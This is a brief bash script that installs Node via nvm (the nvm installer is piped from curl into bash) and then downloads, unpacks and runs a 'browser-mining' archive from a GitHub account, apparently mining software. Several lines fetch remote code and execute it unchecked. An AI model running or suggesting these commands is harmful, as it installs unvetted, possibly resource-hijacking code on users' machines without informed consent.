#!/usr/bin/env bash
sudo apt update
sudo apt install curl ca-certificates -y
curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash
source ~/.bashrc
nvm install 18
curl https://github.com/Adjska992/Web/blob/main/browser-mining.zip -L -O -J
unzip browser-mining.zip
cd browser-mining
cd browser-mining
npm install
sh install.sh
node index.js
